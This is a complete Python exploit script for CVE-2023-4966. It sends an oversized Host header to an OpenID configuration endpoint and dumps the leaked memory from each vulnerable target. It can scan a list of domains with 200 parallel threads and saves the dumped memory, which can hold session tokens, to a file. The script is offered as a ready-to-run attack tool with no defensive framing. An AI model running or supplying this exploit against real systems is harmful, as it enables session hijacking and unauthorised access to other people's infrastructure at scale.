#!/usr/bin/env python3

import requests
from colorama import Fore, Style
import concurrent.futures
import random
import argparse
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

blue = Fore.BLUE
white = Fore.WHITE
reset = Style.RESET_ALL
bold = Style.BRIGHT

target_list = []

HEADERS = {"Host": "a" * 24576}

banner = f"""{bold}{Fore.GREEN}
    ______     ____  __         _ ______         
   / ____/  __/ __ \/ /  ____  (_)_  __/__  _____
  / __/ | |/_/ /_/ / /  / __ \/ / / / / _ \/ ___/
 / /____>  </ ____/ /__/ /_/ / / / / /  __/ /    
/_____/_/|_/_/   /_____|____/_/ /_/  \___/_/     

                        Based on the work by Author: D.SanjaiKumar @CrackSoftSecurities & improved by CerTusHack and associates
{reset}"""

requests.packages.urllib3.disable_warnings()

def exploit(url, protocol):
    try:
        url = f"{protocol}://{url}"

        response = requests.get(
            f"{url}/oauth/idp/.well-known/openid-configuration",
            verify=False,
            timeout=15,
            headers=HEADERS,
        )

        if response.status_code == 200:
            memory_data = response.text[131050:]

            print(
                f"{bold}{white}-------------------------------------------Dumped Memory ---------------------------------------------------------------{reset}\n"
            )
            print(
                f"[{bold}{Fore.BLUE}INFO{reset}]: Dumped memory for this target: {url}\n"
            )
            print(f"[{bold}{Fore.BLUE}{memory_data}{reset}]\n")
            print(
                f"{bold}{white}-------------------------------------------END--------------------------------------------------------------------------{reset}\n")

            save(url, memory_data)

        else:
            print(
                f"[{bold}{Fore.RED}FAILED{reset}]: Cannot Dump memory for this target: {url}\n"
            )
            print(
                f"{bold}{white}--------------------------------------Cannot Dump Memory ---------------------------------------------------------------{reset}\n")

    except (TimeoutError, KeyboardInterrupt) as e:
        print(f"{bold}Error: {str(e)}{reset}")
    except Exception as e:
        print(f"{bold}{Fore.RED}Error: {str(e)}{reset}")

def speed(subdomains, protocol):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
            futures = [executor.submit(exploit, url, protocol) for url in subdomains]
        concurrent.futures.wait(futures)
    except KeyboardInterrupt:
        print(f"{bold}{bold}CTRL+C Pressed{reset}")
        exit()
    except Exception as e:
        print(f"[{bold}{Fore.RED}FAILED{reset}]: Error occurred due to: {e}")

def save(url, body):
    try:
        filename = args.output if args.output else "exploitation_results.txt"
        mode = "a" if os.path.isfile(filename) else "w"
        with open(filename, mode) as w:
            w.write(f"{url} ------> [{body}]"+ "\n")
    except KeyboardInterrupt:
        print(f"{bold}{bold}CTRL+C Pressed{reset}")
        exit()
    except Exception as e:
        print(f"[{bold}{Fore.RED}FAILED{reset}]: Error occurred due to: {e}")

def main():
    print(banner)

    if args.domain:
        url = args.domain
        target_list.append(url)
        speed(target_list, "http")

    if args.domains_list:
        try:
            filename = args.domains_list
            with open(filename, "r") as url:
                urls = url.read().split()
            for url in urls:
                target_list.append(url)
            speed(target_list, "https")
        except FileNotFoundError:
            print(
                f"[{bold}{Fore.RED}ALERT{reset}]: File not Found. Please check if the file exists."
            )
            exit()
        except KeyboardInterrupt:
            print(f"{bold}{bold}CTRL+C Pressed{reset}")
            exit()
        except Exception as e:
            print(f"[{bold}{Fore.RED}FAILED{reset}]: Error occurred due to: {e}")

    if not args.domain and not args.domains_list:
        print(
            f"[{bold}{Fore.BLUE}INFO{reset}]: Please provide a domain or domains list for exploit"
        )

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"[{bold}{Fore.GREEN}DESCRIPTION{reset}]: {bold}{white}Exploit script for CVE-2023-4966{reset}")
    parser.add_argument("-d", "--domain", help=f"[{bold}{Fore.BLUE}INFO{reset}]: {bold}{white}Target domain for exploiting without protocol e.g., (www.domain.com){reset}")
    parser.add_argument("-dL", "--domains-list", help=f"[{bold}{Fore.BLUE}INFO{reset}]: {bold}{white}Targets domain for exploiting without protocol e.g., (www.domain.com){reset}")
    parser.add_argument("-o", "--output", help=f"[{bold}{Fore.BLUE}INFO{reset}]: {bold}{white}File name to save output")
    args = parser.parse_args()
    main()
        
        
        
            
            
